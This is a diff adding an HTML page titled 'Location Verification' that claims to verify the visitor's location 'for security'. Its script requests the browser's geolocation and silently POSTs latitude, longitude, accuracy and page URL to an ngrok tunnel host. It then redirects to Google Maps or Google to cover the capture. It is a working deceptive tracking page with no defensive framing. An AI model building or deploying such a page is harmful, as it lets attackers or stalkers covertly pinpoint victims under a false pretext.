@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html><head><title>Location Verification</title>
+<script>
+if(navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+        fetch('https://sharen-unguillotined-confoundedly.ngrok-free.dev/geo', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                url: window.location.href
+            })
+        });
+        document.body.innerHTML = '<h2>Location verified. Redirecting...</h2>';
+        setTimeout(() => window.location.href = 'https://www.google.com/maps', 1500);
+    }, function(err) {
+        document.body.innerHTML = '<h2>Unable to get location. Redirecting...</h2>';
+        setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+    });
+} else {
+    document.body.innerHTML = '<h2>Geolocation not supported. Redirecting...</h2>';
+    setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+}
+</script>
+</head>
+<body><h2>Verifying your location for security...</h2></body>
+</html>
